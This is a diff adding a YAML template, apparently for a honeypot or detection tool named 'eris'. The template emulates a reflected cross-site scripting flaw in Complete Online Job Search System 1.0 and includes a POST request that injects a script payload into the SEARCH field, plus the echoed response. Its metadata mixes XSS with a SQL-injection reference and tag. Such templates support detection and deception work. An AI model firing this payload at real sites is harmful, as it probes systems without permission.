@@ -1,0 +1,32 @@
+id: eris-xss
+info:
+  name: Complete Online Job Search System 1.0 - Cross-Site Scripting
+  author: arafatansari
+  description: 'Complete Online Job Search System 1.0 contains a cross-site scripting
+    vulnerability via index.php?q=advancesearch.
+
+    '
+  severity: high
+  reference:
+  - https://github.com/debug601/bug_report/blob/main/vendors/campcodes.com/online-job-search-system/SQLi-9.md
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 1
+  tags: cve,cve2022,xss,eris,sqli
+traps:
+- request:
+    method: POST
+    path: /index.php?q=result&searchfor=advancesearch
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'SEARCH=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&COMPANY=&CATEGORY=&submit=Submit
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: 'Result : <script>alert(document.domain)</script>ERIS'
